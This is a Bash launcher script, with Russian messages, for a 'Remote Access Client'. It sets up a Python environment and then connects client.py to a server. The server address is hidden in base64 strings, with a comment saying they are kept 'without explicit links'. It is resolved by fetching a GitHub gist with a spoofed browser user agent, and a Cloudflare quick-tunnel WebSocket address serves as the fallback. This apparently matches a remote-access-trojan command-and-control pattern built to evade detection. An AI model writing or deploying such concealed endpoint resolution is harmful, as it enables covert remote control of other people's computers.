#!/usr/bin/env bash
set -e
cd "$(dirname "$0")"

echo "=========================================="
echo " Запуск Remote Access Client на MOS_OS"
echo "=========================================="

if ! command -v python3 &>/dev/null; then
    echo "[!] Ошибка: Python 3 не установлен."
    exit 1
fi

if [ ! -d ".venv" ]; then
    echo "[*] Создание виртуального окружения .venv..."
    python3 -m venv .venv
fi

echo "[*] Установка зависимостей..."
if [ -d "wheels" ]; then
    echo "[*] Установка из локального кэша wheels (офлайн-режим)..."
    .venv/bin/pip install --no-index --find-links=wheels -r requirements.txt 2>/dev/null || .venv/bin/pip install --find-links=wheels -r requirements.txt
else
    .venv/bin/pip install -r requirements.txt
fi

# Получение актуального адреса сервера (без явных ссылок)
_EP=$(echo "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXcvNWVkM2RmMTE4MTcxZWM5YmMwY2U4ZDM3YmMwZGNkMjgvc2VydmVyX3VybC50eHQ=" | base64 -d)
_FB=$(echo "d3NzOi8vYW5hbHlzdHMtbW90aGVycy1wb3dlci1jaHJvbmljbGUudHJ5Y2xvdWRmbGFyZS5jb20=" | base64 -d)

echo "[*] Получение актуального адреса сервера..."
DYNAMIC_URL=$(curl -s -m 5 -A "Mozilla/5.0" "$_EP" 2>/dev/null | tr -d '\r\n')
if [[ "$DYNAMIC_URL" == ws* ]]; then
    export SERVER_URL="$DYNAMIC_URL"
    echo "[+] Адрес успешно получен"
else
    export SERVER_URL="${SERVER_URL:-$_FB}"
    echo "[!] Используется резервный адрес"
fi

echo "[*] Подключение к серверу: $SERVER_URL"
exec .venv/bin/python client.py
